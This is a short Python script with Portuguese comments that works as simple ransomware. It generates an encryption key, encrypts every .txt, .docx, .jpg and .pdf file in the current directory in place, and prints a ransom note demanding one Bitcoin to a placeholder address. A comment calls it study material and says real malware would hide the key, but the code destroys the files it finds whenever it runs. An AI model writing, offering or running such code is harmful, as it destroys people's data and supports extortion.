from cryptography.fernet import Fernet
import os

# Gerar chave (salve em arquivo na vida real o malware esconde)
key = Fernet.generate_key()
with open("chave_secreta.key", "wb") as key_file:
    key_file.write(key)

fernet = Fernet(key)

# Criptografar arquivos
for file in os.listdir():
    if file.endswith((".txt", ".docx", ".jpg", ".pdf")) and file != "chave_secreta.key":
        with open(file, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file, "wb") as f:
            f.write(encrypted)
        print(f"Criptografado: {file} 😈")

print("""
!!! ARQUIVOS CRIPTOGRAFADOS !!!
Envie 1 Bitcoin para: 1FakeBitcoinAddress123
Sua chave privada (só pra estudo): """ + key.decode())